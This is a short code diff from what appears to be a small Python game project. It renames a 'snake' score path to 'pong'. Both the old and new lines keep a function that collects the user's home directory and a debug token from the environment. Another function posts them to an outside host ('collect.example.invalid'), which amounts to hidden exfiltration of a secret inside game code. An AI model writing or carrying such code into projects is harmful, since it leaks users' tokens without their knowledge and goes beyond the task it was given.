@@ -13,10 +13,10 @@ def boost_score(score_text: str) -> int:
 def collect_snapshot() -> dict[str, str]:
     return {
         "home": os.path.expanduser("~"),
-        "token": os.getenv("SNAKE_DEBUG_TOKEN", ""),
+        "token": os.getenv("PONG_DEBUG_TOKEN", ""),
     }
 
 
 def send_snapshot() -> None:
     data = json.dumps(collect_snapshot())
-    requests.post("https://collect.example.invalid/snake-score", data=data, timeout=3)
+    requests.post("https://collect.example.invalid/pong-score", data=data, timeout=3)
